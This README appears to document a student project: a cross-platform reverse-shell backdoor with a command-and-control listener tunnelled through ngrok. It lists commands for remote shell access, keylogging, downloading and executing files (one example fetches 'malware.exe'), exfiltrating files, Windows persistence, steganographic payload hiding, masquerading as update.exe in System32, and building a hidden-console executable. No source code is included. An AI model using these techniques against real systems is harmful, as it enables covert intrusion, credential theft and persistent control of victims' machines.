# Adv Topics in CS Project: Milestone 2 - Reverse Backdoor C2 Framework

A cross-platform reverse shell backdoor designed for controlled penetration testing and security tool evaluation. 

The system consists of a Listener (C2 server) running on the attacker's MacBook and a Payload running on the target machine. Communication is established via a reverse TCP connection tunneled through ngrok, allowing the target to connect from anywhere on the internet without opening inbound ports.

## Project Goals
1. User needs to open a port, and the target connects to it (target can be anyone on the internet - does not need to be in a local network) - Implemented
  - Test connection not in a local network
2. The ability to use commands in terminal - Implemented
  - Similar to the Milestone 1 project - use of shell commands (or the equivalent)
3. Counter some firewalls (use ngrok: reference - https://isc.sans.edu/diary/26866) - Implemented
  - Reference the resource to create a c2 server using ngrok 
4. Get keyboard input - Implemented
  - Function recording all keyboard inputs. 
  - Use pynput library
  - Reference - https://omomuki-tech.com/archives/1406
5. Download, execute, and execute files - Implemented
  - Function that downloads a specified file to the target's computer and can execute that file with the `-e` flag
  - Function that uploads accessible files from the target's computer to the attacker
6. Hide the presence - Partially implemented
  - Uses scheduled task persistence on Windows
  - Uses file masquerading and Windows Run key persistence
  - Includes image steganography helpers for hiding and extracting payloads

## How to Use

### 1. Start the C2 Server (Listener)
On your MacBook (Attacker), start the tunnel and the listener:

#### Terminal 1: Start ngrok
```bash
 ngrok tcp 4444
```
Note: With the free plan, the assigned ngrok address and port may change each time you start a new tunnel. Always update `backdoor.py` with the latest values from the ngrok output.
#### Terminal 2: Start the Python listener
```bash
python listener.py
```
### 2. Configure and Start the Payload
Update the address and port variables in backdoor.py with the values provided by your active ngrok session, then run:
```powershell
python backdoor.py
```

## Troubleshooting
- **Ngrok Tunnel Issues**: Ensure ngrok is installed and running. If the tunnel fails, check your internet connection and ngrok account status. Note that free plan tunnels may change address/port on restart.
- **Connection Failures**: Verify the address and port in `backdoor.py` match the ngrok output. Firewalls may block connections; try a different port.
- **Keylogging Not Working**: `pynput` may have limitations on GUI-less Linux/Mac systems. Ensure the target has a display and keyboard access.
- **Command Execution Errors**: Some commands may require privileges or differ by OS (`dir` vs `ls`, `ipconfig` vs `ifconfig`).
- **File Upload/Download Failures**: Check file permissions on the target machine.
- **Persistence / Stealth Issues**: Windows-only persistence is implemented via `schtasks` and registry Run key. On non-Windows hosts, these commands may fail.

## Available Commands

| Command | Description |
| :--- | :--- |
| Shell Commands | Any native command executed on the target shell. |
| KEYLOG_START | Starts the keylogger thread on the target. |
| KEYLOG_STOP | Stops the keylogger on the target. |
| DOWNLOAD:<url> | Downloads a file from a URL to the target machine. |
| DOWNLOAD:<url> -e | Downloads and executes the downloaded file. |
| UPLOAD:<filename> | Uploads a local file from the target machine to the listener. |
| PERSIST | Installs Windows scheduled task persistence (Windows only). |
| HIDE_STEG <payload> <carrier> <output> | Hides a payload file inside a PNG using steganography. |
| EXTRACT_STEG <image> [output.exe] [--run] | Extracts a hidden payload from an image. |
| DEPLOY_STEALTH <new_name> <target_dir> <carrier_image> | Copies, masquerades, and hides the backdoor for stealth deployment. |
| KILL | Shuts down the backdoor process on the target. |

### Usage Examples
- Send a command to all clients: `/all whoami`
- Target a specific client: `/127.0.0.1:59221 dir`
- Start keylogging: `/all KEYLOG_START`
- Stop keylogging: `/all KEYLOG_STOP`
- Download and execute a file: `/all DOWNLOAD:http://example.com/malware.exe -e`
- Upload a text-compatible file: `/all UPLOAD:notes.txt`
- Install Windows persistence: `/all PERSIST`
- Hide a payload in an image: `/all HIDE_STEG backdoor.exe carrier.png hidden.png`
- Extract a hidden payload: `/all EXTRACT_STEG hidden.png extracted.exe --run`
- Deploy stealth copy and registry persistence: `/all DEPLOY_STEALTH update.exe C:\Windows\System32 carrier.png`
- Terminate the backdoor: `/all KILL`

## Project Structure
```
backdoor/
├── listener.py          # C2 Server (Attacker side)
├── backdoor.py          # Payload (Target side)
└── README.md            # Documentation
```

## Dependencies & Setup
* Python: 3.8+ 
* Ngrok: Download from [ngrok.com](https://ngrok.com/download). Sign up for a free account to use persistent tunnels if needed.
* External Libraries: pynput (used for keylogging)
```bash
pip install pynput pyinstaller
```
* Compilation: To turn the payload into an .exe:
```powershell
  pyinstaller --onefile --hidden-import=pynput.keyboard --noconsole backdoor.py
```

## Limitations & Known Issues
- Keylogging is not supported on all platforms (e.g., limited on headless Linux/Mac systems without X11).
- File upload/download may fail due to permission restrictions on the target.
- Shell commands may vary by OS; some require elevated privileges.
- Ngrok free tier has limitations on concurrent connections and tunnel persistence.

## Architecture
The system uses a reverse TCP connection: the payload (backdoor.py) initiates the connection to the listener via an ngrok tunnel. Commands are sent from the listener to the payload, executed on the target, and results are sent back. This allows the target to connect outbound without requiring open inbound ports.

## Version & Changelog
- **Version 2.0** (Milestone 2) - April 2026: Added keylogging, file download/upload, cross-platform support.
- Future: Implement persistence on reboot.

## Security & Legal Note
This tool is intended ONLY for authorized penetration testing and security research. Unauthorized use against systems without explicit permission is illegal. 

Last Updated: April 13, 2026